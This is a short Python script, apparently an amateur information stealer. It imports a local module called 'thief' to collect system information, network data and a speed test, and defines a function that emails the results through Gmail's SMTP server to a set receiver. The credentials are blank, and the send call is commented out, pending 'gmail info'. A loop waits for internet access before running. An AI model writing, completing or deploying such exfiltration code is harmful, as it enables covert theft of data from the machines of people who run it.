
import smtplib, ssl
import urllib.request
import thief
import time

# Sends an email with system info
def sandemail():
    smtp_server = "smtp.gmail.com"
    port = 465
    sender_email = ""
    password = ""
    receiver = ""
    message = """
    {0}
    {1}
    {2}
    """.format(
        thief.get_info(), thief.scrap_network(), thief.speed_test()
    )

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver, message)

def test():
    print(thief.get_info())
    #print(thief.scrap_network()) <---- very brocken, cant fix.
    print(thief.speed_test())

# loops untill gets insetnet connects
def connect():
    try:
        urllib.request.urlopen("https://www.google.co.uk/")
        print("go go go")
        #sandemail() <---- fill in gmail info first
        test()
        return True
    except:
        print('no internet')
        return False

while connect() == False:
    time.sleep(5)
